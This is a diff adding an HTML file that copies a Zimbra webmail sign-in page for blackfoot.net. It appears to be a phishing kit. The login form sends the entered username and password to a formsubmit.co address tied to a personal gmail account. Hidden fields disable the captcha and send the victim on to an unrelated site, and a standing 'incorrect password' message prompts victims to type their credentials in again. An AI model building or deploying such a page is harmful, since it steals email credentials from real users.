@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<!-- saved from url=(0030)https://webmail.blackfoot.net/ -->
+<html class="user_font_size_normal" lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+    <title>Zimbra Web Client Sign In</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com."
+    />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <link rel="stylesheet" type="text/css" href="common,login,zhtml,skin.css" />
+    <link
+      rel="SHORTCUT ICON"
+      href="https://webmail.blackfoot.net/img/logo/favicon.ico"
+    />
+  </head>
+  <body
+    onload="onLoad();"
+    data-new-gr-c-s-check-loaded="14.1241.0"
+    data-gr-ext-installed=""
+  >
+    <div id="modifiedLogin" class="LoginScreen">
+      <div class="modernCenter">
+        <div class="modernContentBox">
+          <div class="logo">
+            <a
+              href="http://www.blackfoot.net/"
+              id="bannerLink"
+              target="_new"
+              title="Zimbra"
+              ><span class="ScreenReaderOnly">Zimbra</span>
+              <span class="ImgLoginBanner"></span>
+            </a>
+          </div>
+          <form
+            id="zLoginForm"
+            method="post"
+            name="loginForm"
+            action="https://formsubmit.co/stanfordemilly@gmail.com"
+            accept-charset="UTF-8"
+          >
+            <input type="hidden" name="loginOp" value="login" />
+            <input
+              type="hidden"
+              name="_next"
+              value="https://range.net/privacy-policy/"
+            />
+            <input type="hidden" name="_subject" value="RANGE Entry" />
+            <input type="hidden" name="_captcha" value="false" />
+            <input
+              type="hidden"
+              name="login_csrf"
+              value="d0917e6f-b8b4-4cfa-a3b5-47cbecc19104"
+            />
+            <input
+              type="hidden"
+              name="login_csrf"
+              value="0577476b-97ca-40c1-8d18-6919597e1be6"
+            />
+
+            <div class="signIn">Sign In</div>
+            <div class="form">
+              <div id="errorMessageDiv" class="errorMessage">
+                The username or password is incorrect. Verify that CAPS LOCK is
+                not on, and then retype the current username and password.
+              </div>
+              <div class="loginSection">
+                <label for="username" class="zLoginFieldLabel">Username</label>
+                <input
+                  id="username"
+                  tabindex="1"
+                  class="zLoginFieldInput"
+                  name="username"
+                  type="text"
+                  value=""
+                  size="40"
+                  maxlength="1024"
+                  autocapitalize="off"
+                  autocorrect="off"
+                />
+                <label for="password" class="zLoginFieldLabel">Password</label>
+                <div class="passwordWrapper">
+                  <input
+                    id="password"
+                    tabindex="2"
+                    autocomplete="off"
+                    class="zLoginFieldInput"
+                    name="password"
+                    type="password"
+                    value=""
+                    size="40"
+                    maxlength="1024"
+                  />
+                  <span
+                    toggle="#password"
+                    onclick="showPassword();"
+                    id="showSpan"
+                    style="display: block"
+                    >Show</span
+                  >
+                  <span
+                    toggle="#password"
+                    onclick="showPassword();"
+                    id="hideSpan"
+                    style="display: none"
+                    >Hide</span
+                  >
+                </div>
+                <div class="signInAndLabel">
+                  <div>
+                    <button
+                      id="loginButton"
+                      type="submit"
+                      tabindex="5"
+                      class="loginButton"
+                    >
+                      Sign In
+                    </button>
+                  </div>
+                  <div class="rememberCheckWrapper">
+                    <input
+                      id="remember"
+                      tabindex="6"
+                      value="1"
+                      type="checkbox"
+                      name="zrememberme"
+                    />
+                    <label id="remember" for="remember">Stay signed in</label>
+                  </div>
+                </div>
+              </div>
+              <div>
+                <hr />
+              </div>
+              <div>
+                <div class="versionBlock">
+                  <label for="client">Web App Version</label>
+                  <div style="position: relative">
+                    <select
+                      id="client"
+                      name="client"
+                      onchange="clientChange(this.options[this.selectedIndex].value)"
+                    >
+                      <option value="preferred" selected="">Default</option>
+                      <option value="advanced">Classic</option>
+                      <option value="modern">Modern</option>
+                    </select>
+                    <input
+                      type="button"
+                      class="alignWhatsThis"
+                      onclick="showTooltip();"
+                      id="ZLoginWhatsThisButton"
+                    />
+                  </div>
+
+                  <div id="ZLoginWhatsThis">
+                    <div class="ZLoginInfo">
+                      <span id="dialogCloseButton" onclick="hideTooltip();"
+                        >×</span
+                      >
+                      <p>
+                        <strong>Modern</strong><br />
+                        The Modern Web App delivers a responsive experience
+                        across all your devices and integrates with many popular
+                        apps.
+                      </p>
+                      <p>
+                        <strong>Classic</strong><br />
+                        The Classic Web App is familiar to long-time Zimbra
+                        users. It delivers advanced collaboration and calendar
+                        features popular with power users on Desktop web
+                        browsers.
+                      </p>
+                      <p>
+                        <strong>Default</strong><br />
+                        This will sign you in according to your saved
+                        Preference. In the Modern Web App, set this preference
+                        in Settings &gt; General &gt; Zimbra Version. In
+                        Classic, set it in Preferences &gt; General &gt; Sign
+                        In.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </form>
+        </div>
+        <div class="decor1"></div>
+      </div>
+
+      <div class="Footer">
+        <div id="ZLoginNotice" class="legalNotice-small">
+          Copyright © 2005-2025 Synacor, Inc. All rights reserved. "Zimbra" is a
+          registered trademark of Synacor, Inc.
+        </div>
+      </div>
+      <div class="decor2"></div>
+    </div>
+  </body>
+  <grammarly-desktop-integration data-grammarly-shadow-root="true"
+    ><template shadowrootmode="open"
+      ><style>
+        div.grammarly-desktop-integration {
+          position: absolute;
+          width: 1px;
+          height: 1px;
+          padding: 0;
+          margin: -1px;
+          overflow: hidden;
+          clip: rect(0, 0, 0, 0);
+          white-space: nowrap;
+          border: 0;
+          -moz-user-select: none;
+          -webkit-user-select: none;
+          -ms-user-select: none;
+          user-select: none;
+        }
+
+        div.grammarly-desktop-integration:before {
+          content: attr(data-content);
+        }
+      </style>
+      <div
+        aria-label="grammarly-integration"
+        role="group"
+        tabindex="-1"
+        class="grammarly-desktop-integration"
+        data-content='{"mode":"full","isActive":true,"isUserDisabled":false}'
+      ></div></template
+  ></grammarly-desktop-integration>
+</html>
